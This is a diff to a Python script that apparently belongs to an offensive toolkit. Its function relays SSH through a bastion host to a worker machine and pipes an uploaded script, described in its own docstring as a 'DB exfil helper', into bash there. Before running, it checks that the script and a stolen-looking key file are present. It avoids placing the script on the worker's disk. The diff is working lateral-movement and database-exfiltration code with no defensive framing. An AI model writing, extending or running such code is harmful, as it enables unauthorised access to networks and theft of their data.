@@ -196,18 +196,29 @@ def worker_has_bash(base: list[str], bastion: str, worker_ip: str) -> bool:
 
 
 def run_worker_db_collection(base: list[str], bastion: str, worker_ip: str) -> bool:
+    """Run the optional DB exfil helper on the worker through the bastion.
+
+    container-admin1.sh is uploaded to the bastion as /tmp/container-admin1.sh.
+    It is not present on the worker, so we stream it through SSH and execute it
+    on the worker with bash reading from stdin.
+    """
     nested = (
+        "test -f /tmp/container-admin1.sh && test -f /tmp/key && "
         f"{remote_ssh_base()} -p {TARGET_PORT} {TARGET_USER}@{worker_ip} "
-        "'/usr/bin/env bash /tmp/container-admin1.sh 1'"
+        "'/usr/bin/env bash -s -- 1' < /tmp/container-admin1.sh"
     )
+
     completed = run(
         base + ["-p", BASTION_PORT, f"{BASTION_USER}@{bastion}", nested],
         capture_output=True,
     )
+
     if completed.stdout:
         print(completed.stdout, end="")
+
     if completed.returncode == 0:
         return True
+
     reason = clean_reason(completed.stderr or completed.stdout or "")
     print(f"[!] DB exfil script skipped/failed on {worker_ip}: {reason}")
     return False
